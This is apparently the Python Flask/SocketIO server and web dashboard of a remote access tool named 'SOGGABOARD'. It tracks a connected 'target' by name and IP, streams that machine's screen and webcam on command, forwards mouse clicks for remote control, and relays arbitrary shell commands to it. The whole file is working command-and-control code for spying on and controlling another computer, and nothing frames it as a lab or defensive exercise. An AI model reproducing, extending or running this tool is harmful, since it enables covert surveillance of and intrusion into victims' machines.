import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import socket

app = Flask(__name__)
app.config['SECRET_KEY'] = 'sogga_win_server_v27'
# Use eventlet for high-speed streaming on Windows
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# GLOBAL STATE: Keeps data alive when you refresh the Chrome/Edge window
CURRENT_TARGET = {"name": "OFFLINE", "ip": "0.0.0.0", "active": False}

def get_server_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

server_host = get_server_ip()

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SOGGABOARD // WINDOWS HOST</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <style>
        :root { --neon: #00ff41; --danger: #ff003c; --bg: #020202; --ui: #0a0a0c; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        .top-nav { height: 60px; background: #000; border-bottom: 2px solid var(--neon); padding: 0 20px; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
        .ping-dot { height: 8px; width: 8px; background: var(--neon); border-radius: 50%; display: inline-block; box-shadow: 0 0 8px var(--neon); }

        .main-layout { display: grid; grid-template-columns: 1fr 400px; height: calc(100vh - 140px); gap: 15px; padding: 15px; overflow: hidden; }

        .viewer { background: #000; border: 1px solid #1a1a1a; display: flex; align-items: center; justify-content: center; position: relative; border-radius: 4px; overflow: hidden; height: 100%; }
        #live-view { max-width: 100%; max-height: 100%; object-fit: contain; }

        .right-pane { display: flex; flex-direction: column; height: 100%; overflow: hidden; }
        .console-wrap { flex: 1; display: flex; flex-direction: column; background: var(--ui); border: 1px solid #222; border-radius: 4px; overflow: hidden; }
        #console-output { flex: 1; padding: 15px; font-size: 11px; color: var(--neon); overflow-y: auto; white-space: pre-wrap; word-break: break-all; background: rgba(0,0,0,0.8); }

        .footer { height: 80px; background: #000; border-top: 1px solid #1a1a1a; display: flex; gap: 10px; justify-content: center; align-items: center; flex-shrink: 0; }
        button { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 10px 15px; cursor: pointer; text-transform: uppercase; font-size: 11px; font-weight: bold; }
        button:hover { background: var(--neon); color: #000; }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 10px; width: 350px; outline: none; }
    </style>
</head>
<body>
    <div class="top-nav">
        <div style="font-weight:900; letter-spacing:3px;">SOGGABOARD // WIN_SRV</div>
        <div style="font-size:12px;"><span id="pinger" class="ping-dot"></span> STATUS: <span id="c-status">STANDBY</span></div>
        <div style="font-size:12px;">TARGET: <span id="target-id" style="color:white">--</span> | IP: <span id="target-ip" style="color:white">0.0.0.0</span></div>
    </div>

    <div class="main-layout">
        <div id="view-container" class="viewer" onclick="handleScreenClick(event)">
            <img id="live-view" src="">
            <div id="osd" style="position:absolute; bottom:10px; left:10px; font-size:10px; background:rgba(0,0,0,0.8); padding:5px; border:1px solid #333;">SIGNAL: IDLE</div>
        </div>

        <div class="right-pane">
            <div class="console-wrap">
                <div id="console-output">>> WIN_SERVER v2.7 ONLINE...</div>
            </div>
        </div>
    </div>

    <div class="footer">
        <button onclick="sendAction('start_share')">SCR ON</button>
        <button onclick="sendAction('stop_share')">SCR OFF</button>
        <button onclick="sendAction('start_webcam')">CAM ON</button>
        <button onclick="sendAction('stop_webcam')">CAM OFF</button>
        <button id="ctrl-btn" onclick="toggleControl()">CTRL: OFF</button>
        <input type="text" id="cmd-input" placeholder="Execute shell command..." onkeydown="if(event.key==='Enter')sendCmd()">
        <button onclick="sendCmd()">EXE</button>
    </div>

    <script>
        const socket = io();
        const view = document.getElementById('live-view');
        const consoleBox = document.getElementById('console-output');
        let controlEnabled = false;
        let connectionLogged = false;

        function log(msg) {
            consoleBox.innerHTML += `\\n[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }

        setInterval(() => {
            const pinger = document.getElementById('pinger');
            pinger.style.opacity = (pinger.style.opacity == "0") ? "1" : "0";
            socket.emit('heartbeat_request'); 
        }, 1000);

        socket.on('client_identity', (data) => {
            document.getElementById('target-id').innerText = data.name;
            document.getElementById('target-ip').innerText = data.ip;
            document.getElementById('c-status').innerText = "LINKED";
            if (!connectionLogged && data.active) {
                log("STABLE LINK ESTABLISHED: " + data.name);
                connectionLogged = true;
            }
        });

        socket.on('stream_frame', (data) => { 
            view.src = "data:image/jpeg;base64," + data.frame; 
            document.getElementById('osd').innerText = "FEED: " + data.type.toUpperCase();
        });

        socket.on('shell_response', (data) => { log("OUT >> " + data.output); });

        function toggleControl() {
            controlEnabled = !controlEnabled;
            document.getElementById('ctrl-btn').innerText = controlEnabled ? "CTRL: ON" : "CTRL: OFF";
        }

        function handleScreenClick(e) {
            if(!controlEnabled) return;
            const rect = view.getBoundingClientRect();
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            socket.emit('client_command', { action: 'click', x: x, y: y });
        }

        function sendCmd() {
            const val = document.getElementById('cmd-input').value;
            if(val) { socket.emit('client_command', {action: 'shell', data: val}); document.getElementById('cmd-input').value = ""; }
        }
        function sendAction(act) { 
            if(act.includes('stop')) { view.src = ""; }
            socket.emit('client_command', {action: act}); 
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(DASHBOARD_HTML)

@socketio.on('heartbeat_request')
def handle_heartbeat():
    if CURRENT_TARGET["active"]:
        emit('client_identity', CURRENT_TARGET, broadcast=True)

@socketio.on('client_command')
def handle_command(data):
    emit('dispatch', data, broadcast=True)

@socketio.on('frame_data')
def handle_frame(data):
    emit('stream_frame', data, broadcast=True)

@socketio.on('register_client')
def handle_identity(data):
    global CURRENT_TARGET
    # In Windows, remote_addr might be 127.0.0.1 if testing locally
    CURRENT_TARGET = {'name': data.get('name'), 'ip': request.remote_addr, 'active': True}
    emit('client_identity', CURRENT_TARGET, broadcast=True)

@socketio.on('shell_response')
def handle_shell(data):
    emit('shell_response', data, broadcast=True)

if __name__ == '__main__':
    print(f"--- SOGGABOARD WINDOWS SERVER ---")
    print(f"Access UI at: http://{server_host}:8888")
    socketio.run(app, host='0.0.0.0', port=8888)
